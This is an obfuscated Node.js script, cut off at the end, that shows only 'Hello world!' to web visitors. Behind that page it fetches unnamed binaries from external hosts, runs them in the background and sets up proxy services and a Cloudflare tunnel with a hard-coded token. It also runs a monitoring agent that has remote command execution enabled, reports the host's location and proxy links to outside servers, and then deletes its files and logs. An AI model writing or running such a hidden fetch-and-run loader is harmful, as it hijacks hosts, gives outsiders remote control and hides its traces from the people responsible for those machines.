const _0x12489e=_0x228b;(function(_0x339a80,_0x362757){const _0x3f526f=_0x228b,_0x2bc9e2=_0x339a80();while(!![]){try{const _0x4eadea=-parseInt(_0x3f526f(0x123))/0x1*(parseInt(_0x3f526f(0x106))/0x2)+-parseInt(_0x3f526f(0x14e))/0x3+-parseInt(_0x3f526f(0xc2))/0x4*(-parseInt(_0x3f526f(0xb9))/0x5)+-parseInt(_0x3f526f(0xaf))/0x6+parseInt(_0x3f526f(0x125))/0x7+-parseInt(_0x3f526f(0x11f))/0x8*(-parseInt(_0x3f526f(0x97))/0x9)+-parseInt(_0x3f526f(0x128))/0xa;if(_0x4eadea===_0x362757)break;else _0x2bc9e2['push'](_0x2bc9e2['shift']());}catch(_0x225466){_0x2bc9e2['push'](_0x2bc9e2['shift']());}}}(_0x5b43,0x3a037));const express=require(_0x12489e(0x109)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x12489e(0xf4)),{promisify}=require(_0x12489e(0x117)),exec=promisify(require(_0x12489e(0xee))[_0x12489e(0x9c)]),{execSync}=require(_0x12489e(0xee)),UPLOAD_URL=process[_0x12489e(0x95)][_0x12489e(0xc0)]||'',PROJECT_URL=process[_0x12489e(0x95)][_0x12489e(0xae)]||'',AUTO_ACCESS=process['env'][_0x12489e(0xd6)]||![],FILE_PATH=process[_0x12489e(0x95)][_0x12489e(0x144)]||_0x12489e(0x133),SUB_PATH=process[_0x12489e(0x95)][_0x12489e(0xeb)]||_0x12489e(0xdb),PORT=process[_0x12489e(0x95)][_0x12489e(0x139)]||process[_0x12489e(0x95)][_0x12489e(0xe3)]||0xbb8,UUID=process[_0x12489e(0x95)][_0x12489e(0x13f)]||_0x12489e(0x130),NEZHA_SERVER=process[_0x12489e(0x95)][_0x12489e(0xb4)]||'',NEZHA_PORT=process[_0x12489e(0x95)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x12489e(0x95)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x12489e(0x95)][_0x12489e(0xe8)]||_0x12489e(0x118),ARGO_AUTH=process[_0x12489e(0x95)][_0x12489e(0x121)]||_0x12489e(0xf1),ARGO_PORT=process[_0x12489e(0x95)][_0x12489e(0x14f)]||0x1f41,CFIP=process[_0x12489e(0x95)][_0x12489e(0x153)]||_0x12489e(0x11e),CFPORT=process[_0x12489e(0x95)]['CFPORT']||0x1bb,NAME=process[_0x12489e(0x95)][_0x12489e(0x143)]||_0x12489e(0xa8);!fs[_0x12489e(0xa5)](FILE_PATH)?(fs[_0x12489e(0xfc)](FILE_PATH),console['log'](FILE_PATH+_0x12489e(0xec))):console[_0x12489e(0xd2)](FILE_PATH+_0x12489e(0xa3));function generateRandomName(){const _0x5d17ad=_0x12489e,_0x44715a=_0x5d17ad(0x147);let _0x2804b7='';for(let _0x24abdc=0x0;_0x24abdc<0x6;_0x24abdc++){_0x2804b7+=_0x44715a[_0x5d17ad(0x138)](Math[_0x5d17ad(0xf0)](Math[_0x5d17ad(0x98)]()*_0x44715a[_0x5d17ad(0xc9)]));}return _0x2804b7;}function _0x5b43(){const _0x145acf=['unshift','trojan','http://ip-api.com/json/','cdns.doon.eu.org','2540456JlvmuG','fileName','ARGO_AUTH','platform','267hsnEje','?security=tls&sni=','34853ICEnMl','Error\x20executing\x20command:\x20','stringify','854720gAOdyf','del\x20/f\x20/q\x20','error','http\x20server\x20is\x20running\x20on\x20port:','443','--tls','listen','statSync','9afd1229-b893-40c1-84dd-51e7ce204913','Error\x20reading\x20boot.log:','includes','./tmp','\x0a\x20\x20credentials-file:\x20','.exe\x20>\x20nul\x202>&1','pipe','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','charAt','SERVER_PORT','sub.txt','https://amd64.ssss.nyc.mn/v1','win32','countryCode','2053','UUID','8443','\x0a\x20\x20tunnel:\x20','127.0.0.1','NAME','FILE_PATH','Nodes\x20uploaded\x20successfully','basename','abcdefghijklmnopqrstuvwxyz','join','Unhandled\x20error\x20in\x20startserver:','/vless-argo','tunnel.json','data','stream','743334kxkWGO','ARGO_PORT','match','\x20>\x20nul\x202>&1','&path=%2Fvless-argo%3Fed%3D2560#','CFIP','true','\x20>/dev/null\x202>&1\x20&','Download\x20','ARGO_DOMAIN:','env','https://oooo.serv00.net/add-url','9WLVKbA','random','split','2096','\x0avless://','exec','readFileSync','country_code','npm\x20running\x20error:\x20','boot.log','message','unlink','\x20already\x20exists','from','existsSync','vmess','/api/delete-nodes','railway','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','taskkill\x20/f\x20/im\x20','Content-Type','substring','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','PROJECT_URL','553848lcSppK','/config.json\x20>/dev/null\x202>&1\x20&','\x20successfully','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','https://amd64.ssss.nyc.mn/web','NEZHA_SERVER','has','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','rm\x20-rf\x20','finish','5EQzjIl','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','catch','Add\x20automatic\x20access\x20task\x20faild:\x20','list.txt','Unknown','Subscription\x20uploaded\x20successfully','UPLOAD_URL','https://amd64.ssss.nyc.mn/agent','1773760rqjfQa','toString','fileUrl','vless','/vmess-argo','utf-8','/trojan-argo','length','https://amd64.ssss.nyc.mn/bot','response','tls','clear','config.yaml','App\x20is\x20running','NEZHA\x20variable\x20is\x20empty,skip\x20running','automatic\x20access\x20task\x20added\x20successfully','log','aarch64','php\x20running\x20error:\x20','2083','AUTO_ACCESS','/dev/null','quic','https://arm64.ssss.nyc.mn/agent','none','sub','application/json','?encryption=none&security=tls&sni=','base64','&path=%2Ftrojan-argo%3Fed%3D2560#','block','then','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','PORT','\x20is\x20running','2087','createWriteStream','readdirSync','ARGO_DOMAIN','send','/api/add-nodes','SUB_PATH','\x20is\x20created','xtls-rprx-vision','child_process','get','floor','eyJhIjoiY2M4N2QyMjQ3Njc3ZTdiMGQzMjBkNzFiN2ZhZDE4YzIiLCJ0IjoiNGViZGU4ZmQtNzMwOC00MjI3LTgwOWMtYzU3MGJjYmUxNmI2IiwicyI6IlkyVXpNakV3WWpZdFpUSTNOaTAwWkRZMkxUZ3dOREF0TWpGbVpXTTNNREUwWVRSbCJ9','test','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','path','map','isFile','status','writeFileSync','Error\x20downloading\x20files:','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','tcp','mkdirSync','\x20-c\x20\x22','\x0aclient_secret:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','&fp=firefox&type=ws&host=','ArgoDomain:','\x20failed:\x20','Skipping\x20adding\x20automatic\x20access\x20task','pop','config.json','770qbLdvW','push','post','express','close','forEach','arm','nohup\x20','org','web\x20running\x20error:\x20','unlinkSync','chmod','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','filter','\x20-c\x20','http','pkill\x20-f\x20\x22[','util','c04c62b6a8a9.5.a.f.0.6.3.0.0.0.7.4.0.1.0.0.2.ip6.arpa','https+local://8.8.8.8/dns-query','TunnelSecret'];_0x5b43=function(){return _0x145acf;};return _0x5b43();}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x12489e(0x148)](FILE_PATH,npmName),phpPath=path[_0x12489e(0x148)](FILE_PATH,phpName),webPath=path[_0x12489e(0x148)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x12489e(0x148)](FILE_PATH,_0x12489e(0x13a)),listPath=path['join'](FILE_PATH,_0x12489e(0xbd)),bootLogPath=path[_0x12489e(0x148)](FILE_PATH,_0x12489e(0xa0)),configPath=path[_0x12489e(0x148)](FILE_PATH,_0x12489e(0x105));function deleteNodes(){const _0x4e1796=_0x12489e;try{if(!UPLOAD_URL)return;if(!fs[_0x4e1796(0xa5)](subPath))return;let _0x2c8a6a;try{_0x2c8a6a=fs[_0x4e1796(0x9d)](subPath,_0x4e1796(0xc7));}catch{return null;}const _0x266949=Buffer[_0x4e1796(0xa4)](_0x2c8a6a,_0x4e1796(0xde))[_0x4e1796(0xc3)](_0x4e1796(0xc7)),_0x51b621=_0x266949[_0x4e1796(0x99)]('\x0a')[_0x4e1796(0x113)](_0x1e64b5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4e1796(0xf2)](_0x1e64b5));if(_0x51b621[_0x4e1796(0xc9)]===0x0)return;return axios[_0x4e1796(0x108)](UPLOAD_URL+_0x4e1796(0xa7),JSON[_0x4e1796(0x127)]({'nodes':_0x51b621}),{'headers':{'Content-Type':'application/json'}})[_0x4e1796(0xbb)](_0x3939f2=>{return null;}),null;}catch(_0x383eb6){return null;}}function cleanupOldFiles(){const _0x4a44e=_0x12489e;try{const _0x2d1451=fs[_0x4a44e(0xe7)](FILE_PATH);_0x2d1451[_0x4a44e(0x10b)](_0x1d6eb6=>{const _0x317699=_0x4a44e,_0x276b0b=path[_0x317699(0x148)](FILE_PATH,_0x1d6eb6);try{const _0x66ba18=fs[_0x317699(0x12f)](_0x276b0b);_0x66ba18[_0x317699(0xf6)]()&&fs[_0x317699(0x110)](_0x276b0b);}catch(_0x259d17){}});}catch(_0x3039cc){}}app[_0x12489e(0xef)]('/',function(_0x41d489,_0x2609ea){const _0x1739f0=_0x12489e;_0x2609ea[_0x1739f0(0xe9)]('Hello\x20world!');});async function generateConfig(){const _0x17278d=_0x12489e,_0x174df1={'log':{'access':_0x17278d(0xd7),'error':_0x17278d(0xd7),'loglevel':_0x17278d(0xda)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x17278d(0xed)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x17278d(0x14a),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x17278d(0xc8),'dest':0xbbc}]},'streamSettings':{'network':_0x17278d(0xfb)}},{'port':0xbb9,'listen':_0x17278d(0x142),'protocol':_0x17278d(0xc5),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x17278d(0xda)}},{'port':0xbba,'listen':_0x17278d(0x142),'protocol':_0x17278d(0xc5),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x17278d(0xda)},'streamSettings':{'network':'ws','security':_0x17278d(0xda),'wsSettings':{'path':_0x17278d(0x14a)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x17278d(0xcc),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x17278d(0x142),'protocol':_0x17278d(0xa6),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x17278d(0xc6)}},'sniffing':{'enabled':!![],'destOverride':[_0x17278d(0x115),_0x17278d(0xcc),_0x17278d(0xd8)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x17278d(0x11c),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x17278d(0xda),'wsSettings':{'path':_0x17278d(0xc8)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x17278d(0xcc),_0x17278d(0xd8)],'metadataOnly':![]}}],'dns':{'servers':[_0x17278d(0x119)]},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':'blackhole','tag':_0x17278d(0xe0)}]};fs[_0x17278d(0xf8)](path[_0x17278d(0x148)](FILE_PATH,_0x17278d(0x105)),JSON[_0x17278d(0x127)](_0x174df1,null,0x2));}function getSystemArchitecture(){const _0x229d8b=_0x12489e,_0x19e9c1=os['arch']();return _0x19e9c1===_0x229d8b(0x10c)||_0x19e9c1==='arm64'||_0x19e9c1===_0x229d8b(0xd3)?_0x229d8b(0x10c):'amd';}function downloadFile(_0x487f92,_0x4f3d10,_0x31bb9b){const _0x38d688=_0x12489e,_0x1de7ef=_0x487f92;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x2c2e26=fs[_0x38d688(0xe6)](_0x1de7ef);axios({'method':'get','url':_0x4f3d10,'responseType':_0x38d688(0x14d)})[_0x38d688(0xe1)](_0x11e3cc=>{const _0x28208b=_0x38d688;_0x11e3cc['data'][_0x28208b(0x136)](_0x2c2e26),_0x2c2e26['on'](_0x28208b(0xb8),()=>{const _0x54c9e6=_0x28208b;_0x2c2e26[_0x54c9e6(0x10a)](),console['log']('Download\x20'+path[_0x54c9e6(0x146)](_0x1de7ef)+_0x54c9e6(0xb1)),_0x31bb9b(null,_0x1de7ef);}),_0x2c2e26['on'](_0x28208b(0x12a),_0x59a08c=>{const _0x3f80dd=_0x28208b;fs[_0x3f80dd(0xa2)](_0x1de7ef,()=>{});const _0x5d7c14='Download\x20'+path['basename'](_0x1de7ef)+'\x20failed:\x20'+_0x59a08c[_0x3f80dd(0xa1)];console[_0x3f80dd(0x12a)](_0x5d7c14),_0x31bb9b(_0x5d7c14);});})[_0x38d688(0xbb)](_0x3af085=>{const _0x86e1b0=_0x38d688,_0x28527b=_0x86e1b0(0x156)+path[_0x86e1b0(0x146)](_0x1de7ef)+_0x86e1b0(0x102)+_0x3af085[_0x86e1b0(0xa1)];console['error'](_0x28527b),_0x31bb9b(_0x28527b);});}async function downloadFilesAndRun(){const _0x1b0bf4=_0x12489e,_0x49fccb=getSystemArchitecture(),_0x2ffa8b=getFilesForArchitecture(_0x49fccb);if(_0x2ffa8b[_0x1b0bf4(0xc9)]===0x0){console[_0x1b0bf4(0xd2)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x5f47f3=_0x2ffa8b[_0x1b0bf4(0xf5)](_0x5547ed=>{return new Promise((_0x41dcbd,_0x24833f)=>{const _0x422e85=_0x228b;downloadFile(_0x5547ed[_0x422e85(0x120)],_0x5547ed[_0x422e85(0xc4)],(_0x18290c,_0x5da6f1)=>{_0x18290c?_0x24833f(_0x18290c):_0x41dcbd(_0x5da6f1);});});});try{await Promise['all'](_0x5f47f3);}catch(_0x4c67c7){console[_0x1b0bf4(0x12a)](_0x1b0bf4(0xf9),_0x4c67c7);return;}function _0x50a50c(_0x2e8469){const _0x1cd76b=0x1fd;_0x2e8469['forEach'](_0xc9d49c=>{const _0x4c6660=_0x228b;fs[_0x4c6660(0xa5)](_0xc9d49c)&&fs[_0x4c6660(0x111)](_0xc9d49c,_0x1cd76b,_0x44cb3c=>{const _0x28b66e=_0x4c6660;_0x44cb3c?console[_0x28b66e(0x12a)]('Empowerment\x20failed\x20for\x20'+_0xc9d49c+':\x20'+_0x44cb3c):console['log']('Empowerment\x20success\x20for\x20'+_0xc9d49c+':\x20'+_0x1cd76b['toString'](0x8));});});}const _0x3282c1=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x50a50c(_0x3282c1);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x173187=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x1b0bf4(0x99)](':')[_0x1b0bf4(0x104)]():'',_0x920eec=new Set([_0x1b0bf4(0x12c),_0x1b0bf4(0x140),_0x1b0bf4(0x9a),_0x1b0bf4(0xe5),_0x1b0bf4(0xd5),_0x1b0bf4(0x13e)]),_0x292caa=_0x920eec[_0x1b0bf4(0xb5)](_0x173187)?_0x1b0bf4(0x154):'false',_0x2f8f53=_0x1b0bf4(0xfe)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x1b0bf4(0xf3)+_0x292caa+_0x1b0bf4(0x137)+UUID;fs[_0x1b0bf4(0xf8)](path[_0x1b0bf4(0x148)](FILE_PATH,_0x1b0bf4(0xce)),_0x2f8f53);const _0x3076e1=_0x1b0bf4(0x10d)+phpPath+_0x1b0bf4(0xfd)+FILE_PATH+_0x1b0bf4(0xad);try{await exec(_0x3076e1),console[_0x1b0bf4(0xd2)](phpName+'\x20is\x20running'),await new Promise(_0x593e26=>setTimeout(_0x593e26,0x3e8));}catch(_0x2691d1){console['error'](_0x1b0bf4(0xd4)+_0x2691d1);}}else{let _0xef5913='';const _0x3b9a4f=[_0x1b0bf4(0x12c),_0x1b0bf4(0x140),_0x1b0bf4(0x9a),'2087',_0x1b0bf4(0xd5),'2053'];_0x3b9a4f[_0x1b0bf4(0x132)](NEZHA_PORT)&&(_0xef5913=_0x1b0bf4(0x12d));const _0x829835=_0x1b0bf4(0x10d)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0xef5913+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x829835),console[_0x1b0bf4(0xd2)](npmName+'\x20is\x20running'),await new Promise(_0x50c0b1=>setTimeout(_0x50c0b1,0x3e8));}catch(_0x3e0386){console['error'](_0x1b0bf4(0x9f)+_0x3e0386);}}}else console[_0x1b0bf4(0xd2)](_0x1b0bf4(0xd0));const _0x18c33b=_0x1b0bf4(0x10d)+webPath+_0x1b0bf4(0x114)+FILE_PATH+_0x1b0bf4(0xb0);try{await exec(_0x18c33b),console[_0x1b0bf4(0xd2)](webName+_0x1b0bf4(0xe4)),await new Promise(_0xc82fd7=>setTimeout(_0xc82fd7,0x3e8));}catch(_0xc5e74b){console[_0x1b0bf4(0x12a)](_0x1b0bf4(0x10f)+_0xc5e74b);}if(fs[_0x1b0bf4(0xa5)](botPath)){let _0x121ada;if(ARGO_AUTH[_0x1b0bf4(0x150)](/^[A-Z0-9a-z=]{120,250}$/))_0x121ada='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x121ada=_0x1b0bf4(0xe2)+FILE_PATH+'/tunnel.yml\x20run':_0x121ada='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x1b0bf4(0xfa)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x121ada+_0x1b0bf4(0x155)),console[_0x1b0bf4(0xd2)](botName+'\x20is\x20running'),await new Promise(_0x476187=>setTimeout(_0x476187,0x7d0));}catch(_0x55043a){console['error'](_0x1b0bf4(0x126)+_0x55043a);}}await new Promise(_0x42bdc8=>setTimeout(_0x42bdc8,0x1388));}function getFilesForArchitecture(_0x40e8b9){const _0x52755=_0x12489e;let _0x17601e;_0x40e8b9===_0x52755(0x10c)?_0x17601e=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x17601e=[{'fileName':webPath,'fileUrl':_0x52755(0xb3)},{'fileName':botPath,'fileUrl':_0x52755(0xca)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1ac7ca=_0x40e8b9==='arm'?_0x52755(0xd9):_0x52755(0xc1);_0x17601e['unshift']({'fileName':npmPath,'fileUrl':_0x1ac7ca});}else{const _0x4c4048=_0x40e8b9===_0x52755(0x10c)?'https://arm64.ssss.nyc.mn/v1':_0x52755(0x13b);_0x17601e[_0x52755(0x11b)]({'fileName':phpPath,'fileUrl':_0x4c4048});}}return _0x17601e;}function argoType(){const _0x103ed1=_0x12489e;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x103ed1(0xd2)](_0x103ed1(0xba));return;}if(ARGO_AUTH[_0x103ed1(0x132)](_0x103ed1(0x11a))){fs[_0x103ed1(0xf8)](path[_0x103ed1(0x148)](FILE_PATH,_0x103ed1(0x14b)),ARGO_AUTH);const _0x58aea6=_0x103ed1(0x141)+ARGO_AUTH['split']('\x22')[0xb]+_0x103ed1(0x134)+path['join'](FILE_PATH,_0x103ed1(0x14b))+_0x103ed1(0xa9)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x103ed1(0xb6);fs[_0x103ed1(0xf8)](path['join'](FILE_PATH,'tunnel.yml'),_0x58aea6);}else console[_0x103ed1(0xd2)](_0x103ed1(0x112));}async function extractDomains(){const _0x5b4bc1=_0x12489e;let _0x3638b6;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3638b6=ARGO_DOMAIN,console[_0x5b4bc1(0xd2)](_0x5b4bc1(0x94),_0x3638b6),await _0x473a23(_0x3638b6);else try{const _0x185328=fs['readFileSync'](path[_0x5b4bc1(0x148)](FILE_PATH,'boot.log'),_0x5b4bc1(0xc7)),_0x29c427=_0x185328[_0x5b4bc1(0x99)]('\x0a'),_0x24926f=[];_0x29c427[_0x5b4bc1(0x10b)](_0x4ecbd1=>{const _0x3d61c2=_0x5b4bc1,_0x53b6c4=_0x4ecbd1[_0x3d61c2(0x150)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x53b6c4){const _0x56073d=_0x53b6c4[0x1];_0x24926f[_0x3d61c2(0x107)](_0x56073d);}});if(_0x24926f[_0x5b4bc1(0xc9)]>0x0)_0x3638b6=_0x24926f[0x0],console[_0x5b4bc1(0xd2)](_0x5b4bc1(0x101),_0x3638b6),await _0x473a23(_0x3638b6);else{console[_0x5b4bc1(0xd2)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path[_0x5b4bc1(0x148)](FILE_PATH,_0x5b4bc1(0xa0)));async function _0xb35659(){const _0x21beab=_0x5b4bc1;try{process[_0x21beab(0x122)]===_0x21beab(0x13c)?await exec(_0x21beab(0xaa)+botName+_0x21beab(0x135)):await exec(_0x21beab(0x116)+botName[_0x21beab(0x138)](0x0)+']'+botName[_0x21beab(0xac)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x118d80){}}_0xb35659(),await new Promise(_0x2e072c=>setTimeout(_0x2e072c,0xbb8));const _0x14f74e=_0x5b4bc1(0xff)+FILE_PATH+_0x5b4bc1(0xfa)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x14f74e+_0x5b4bc1(0x155)),console[_0x5b4bc1(0xd2)](botName+_0x5b4bc1(0xe4)),await new Promise(_0x181cd6=>setTimeout(_0x181cd6,0xbb8)),await extractDomains();}catch(_0x48fbff){console[_0x5b4bc1(0x12a)](_0x5b4bc1(0x126)+_0x48fbff);}}}catch(_0x3e53a1){console[_0x5b4bc1(0x12a)](_0x5b4bc1(0x131),_0x3e53a1);}async function _0x3eb0bd(){const _0x51f5d9=_0x5b4bc1;try{const _0x61532=await axios[_0x51f5d9(0xef)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x61532['data']&&_0x61532[_0x51f5d9(0x14c)][_0x51f5d9(0x9e)]&&_0x61532[_0x51f5d9(0x14c)]['org'])return _0x61532['data'][_0x51f5d9(0x9e)]+'_'+_0x61532[_0x51f5d9(0x14c)]['org'];}catch(_0x513eea){try{const _0x2a7566=await axios[_0x51f5d9(0xef)](_0x51f5d9(0x11d),{'timeout':0xbb8});if(_0x2a7566[_0x51f5d9(0x14c)]&&_0x2a7566[_0x51f5d9(0x14c)][_0x51f5d9(0xf7)]==='success'&&_0x2a7566[_0x51f5d9(0x14c)][_0x51f5d9(0x13d)]&&_0x2a7566[_0x51f5d9(0x14c)][_0x51f5d9(0x10e)])return _0x2a7566[_0x51f5d9(0x14c)][_0x51f5d9(0x13d)]+'_'+_0x2a7566[_0x51f5d9(0x14c)][_0x51f5d9(0x10e)];}catch(_0x258734){}}return _0x51f5d9(0xbe);}async function _0x473a23(_0x52640e){const _0x22ba38=await _0x3eb0bd(),_0x5bf936=NAME?NAME+'-'+_0x22ba38:_0x22ba38;return new Promise(_0x5a0096=>{setTimeout(()=>{const _0x157bf5=_0x228b,_0x1b469a={'v':'2','ps':''+_0x5bf936,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x157bf5(0xda),'host':_0x52640e,'path':'/vmess-argo?ed=2560','tls':_0x157bf5(0xcc),'sni':_0x52640e,'alpn':'','fp':'firefox'},_0x13fb7f=_0x157bf5(0x9b)+UUID+'@'+CFIP+':'+CFPORT+_0x157bf5(0xdd)+_0x52640e+_0x157bf5(0x100)+_0x52640e+_0x157bf5(0x152)+_0x5bf936+'\x0a\x0avmess://'+Buffer['from'](JSON[_0x157bf5(0x127)](_0x1b469a))[_0x157bf5(0xc3)](_0x157bf5(0xde))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x157bf5(0x124)+_0x52640e+_0x157bf5(0x100)+_0x52640e+_0x157bf5(0xdf)+_0x5bf936+'\x0a\x20\x20\x20\x20';console['log'](Buffer['from'](_0x13fb7f)[_0x157bf5(0xc3)](_0x157bf5(0xde))),fs[_0x157bf5(0xf8)](subPath,Buffer[_0x157bf5(0xa4)](_0x13fb7f)[_0x157bf5(0xc3)](_0x157bf5(0xde))),console[_0x157bf5(0xd2)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app['get']('/'+SUB_PATH,(_0x1b27cf,_0x3ce084)=>{const _0x398238=_0x157bf5,_0x26cb75=Buffer[_0x398238(0xa4)](_0x13fb7f)[_0x398238(0xc3)]('base64');_0x3ce084['set'](_0x398238(0xab),'text/plain;\x20charset=utf-8'),_0x3ce084[_0x398238(0xe9)](_0x26cb75);}),_0x5a0096(_0x13fb7f);},0x7d0);});}}async function uploadNodes(){const _0x45ca5c=_0x12489e;if(UPLOAD_URL&&PROJECT_URL){const _0x422fde=PROJECT_URL+'/'+SUB_PATH,_0x5951b2={'subscription':[_0x422fde]};try{const _0x1903f9=await axios[_0x45ca5c(0x108)](UPLOAD_URL+'/api/add-subscriptions',_0x5951b2,{'headers':{'Content-Type':_0x45ca5c(0xdc)}});return _0x1903f9&&_0x1903f9[_0x45ca5c(0xf7)]===0xc8?(console[_0x45ca5c(0xd2)](_0x45ca5c(0xbf)),_0x1903f9):null;}catch(_0x5dc75e){if(_0x5dc75e[_0x45ca5c(0xcb)]){if(_0x5dc75e[_0x45ca5c(0xcb)][_0x45ca5c(0xf7)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x45ca5c(0xa5)](listPath))return;const _0x3af53f=fs[_0x45ca5c(0x9d)](listPath,'utf-8'),_0x594a47=_0x3af53f[_0x45ca5c(0x99)]('\x0a')[_0x45ca5c(0x113)](_0x24aca9=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x45ca5c(0xf2)](_0x24aca9));if(_0x594a47[_0x45ca5c(0xc9)]===0x0)return;const _0x19876a=JSON[_0x45ca5c(0x127)]({'nodes':_0x594a47});try{const _0x528890=await axios[_0x45ca5c(0x108)](UPLOAD_URL+_0x45ca5c(0xea),_0x19876a,{'headers':{'Content-Type':'application/json'}});return _0x528890&&_0x528890['status']===0xc8?(console[_0x45ca5c(0xd2)](_0x45ca5c(0x145)),_0x528890):null;}catch(_0x7889cc){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x4848a9=_0x228b,_0x326437=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x326437[_0x4848a9(0x107)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x326437['push'](phpPath);process['platform']==='win32'?exec(_0x4848a9(0x129)+_0x326437[_0x4848a9(0x148)]('\x20')+_0x4848a9(0x151),_0x40b0c4=>{const _0xdf571a=_0x4848a9;console[_0xdf571a(0xcd)](),console[_0xdf571a(0xd2)](_0xdf571a(0xcf)),console['log'](_0xdf571a(0xb2));}):exec(_0x4848a9(0xb7)+_0x326437['join']('\x20')+'\x20>/dev/null\x202>&1',_0x599823=>{const _0x590e02=_0x4848a9;console[_0x590e02(0xcd)](),console[_0x590e02(0xd2)](_0x590e02(0xcf)),console[_0x590e02(0xd2)](_0x590e02(0xb2));});},0x15f90);}cleanFiles();function _0x228b(_0x423143,_0x183a29){_0x423143=_0x423143-0x94;const _0x5b4351=_0x5b43();let _0x228b54=_0x5b4351[_0x423143];return _0x228b54;}async function AddVisitTask(){const _0x1fc10f=_0x12489e;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x1fc10f(0xd2)](_0x1fc10f(0x103));return;}try{const _0x291ed1=await axios[_0x1fc10f(0x108)](_0x1fc10f(0x96),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x1fc10f(0xdc)}});return console[_0x1fc10f(0xd2)](_0x1fc10f(0xd1)),_0x291ed1;}catch(_0x7815a7){return console['error'](_0x1fc10f(0xbc)+_0x7815a7[_0x1fc10f(0xa1)]),null;}}async function startserver(){try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3d4f23){console['error']('Error\x20in\x20startserver:',_0x3d4f23);}}startserver()['catch'](_0x37d5dd=>{const 